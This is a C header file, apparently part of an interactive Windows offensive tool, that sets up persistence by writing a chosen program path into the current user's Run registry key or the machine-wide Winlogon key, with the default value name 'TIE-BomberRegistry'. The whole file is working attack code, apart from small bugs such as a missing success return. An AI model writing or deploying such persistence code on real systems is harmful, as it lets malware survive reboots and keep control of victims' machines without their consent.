#ifndef PERS_H
#define PERS_H

#include <windows.h>
#include <stdlib.h>
#include "helper.h" 

typedef struct _PERS_CONTEXT {
    HKEY hiveKey;
    char *regKey;
    char *valueName;
    char *valueData;
    DWORD *valueDataLen;
    DWORD valueType;
    char *targetPath;
    DWORD targetPathLen;
} PERS_CONTEXT, *PPERS_CONTEXT;

int GetRegName(char *valueName, void *data) {
    PPERS_CONTEXT pPc = (PPERS_CONTEXT) data;
    if (*valueName != '\0') {
        pPc->valueName = valueName;
    } else {
        snprintf(pPc->valueName, MAX_REG_VALUE_NAME, "TIE-BomberRegistry");
    }

    return SUCCESS;
}

BOOL ModifyRegistry(PPERS_CONTEXT pPc) {
    HKEY hKey = NULL;
    LONG rc;

    rc = RegOpenKeyEx(pPc->hiveKey, (LPCSTR) pPc->regKey, 0, KEY_WRITE, &hKey);
    if (rc != ERROR_SUCCESS) {
        TranslateErrorPrint(GetLastError());
        return FALSE;
    }

    rc = RegSetValueEx(hKey, (LPCSTR) pPc->valueName, 0, pPc->valueType, (unsigned char*) pPc->valueData, *(pPc->valueDataLen));
    if (rc != ERROR_SUCCESS) {
        TranslateErrorPrint(GetLastError());
        RegCloseKey(hKey);
        return FALSE;
    }

    printf("[+] Registry value successfully set\n");
}

BOOL InjectRunRegistry(PPERS_CONTEXT pPc) {
	const char *reg = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    int regLen = strlen(reg);
    pPc->regKey = malloc(MAX_REG_KEY_NAME + 1);
    pPc->valueName = malloc(MAX_REG_VALUE_NAME + 1);
    BOOL rc = FALSE;
    
    pPc->hiveKey = HKEY_CURRENT_USER;
    memcpy(pPc->regKey, reg, regLen);
    pPc->regKey[regLen] = '\0';
    pPc->valueData = pPc->targetPath;
    pPc->valueDataLen = &(pPc->targetPathLen);
    pPc->valueType = REG_SZ;

    if (!PromptUntilValid("Enter value name[ENTER for default]", pPc->valueName, MAX_REG_VALUE_NAME, (ValidatorFunc) &GetRegName, pPc, TRUE)) {
        goto cleanup;
    }
    if (!ModifyRegistry(pPc)) {
        goto cleanup;
    }
    rc = TRUE;

cleanup:
    free(pPc->regKey);
    free(pPc->valueName);

	return rc;
}

BOOL InjectWinlogonRegistry(PPERS_CONTEXT pPc) {
	const char *reg = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
    int regLen = strlen(reg);
    pPc->regKey = malloc(MAX_REG_KEY_NAME + 1);
    pPc->valueName = malloc(MAX_REG_VALUE_NAME + 1);
    BOOL rc = FALSE;
    
    pPc->hiveKey = HKEY_LOCAL_MACHINE;
    memcpy(pPc->regKey, reg, regLen);
    pPc->regKey[regLen] = '\0';
    pPc->valueData = pPc->targetPath;
    pPc->valueDataLen = &(pPc->targetPathLen);
    pPc->valueType = REG_SZ;

    if (!PromptUntilValid("Enter value name[ENTER for default]", pPc->valueName, MAX_REG_VALUE_NAME, (ValidatorFunc) &GetRegName, pPc, TRUE)) {
        goto cleanup;
    }
    if (!ModifyRegistry(pPc)) {
        goto cleanup;
    }
    rc = TRUE;

cleanup:
    free(pPc->regKey);
    free(pPc->valueName);

	return rc;
}

#endif // PERS_H

